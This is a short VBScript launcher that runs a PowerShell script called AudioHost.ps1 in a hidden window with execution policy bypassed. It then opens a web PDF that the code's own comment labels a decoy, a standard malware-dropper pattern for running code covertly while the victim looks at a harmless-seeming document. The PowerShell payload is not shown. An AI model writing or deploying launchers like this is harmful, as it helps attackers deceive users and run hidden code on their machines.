Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)

' Script
shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & scriptDir & "\AudioHost.ps1""", 0, False

' Decoy (PDF)
shell.Run "https://example.com/security-whitepaper.pdf", 1, False
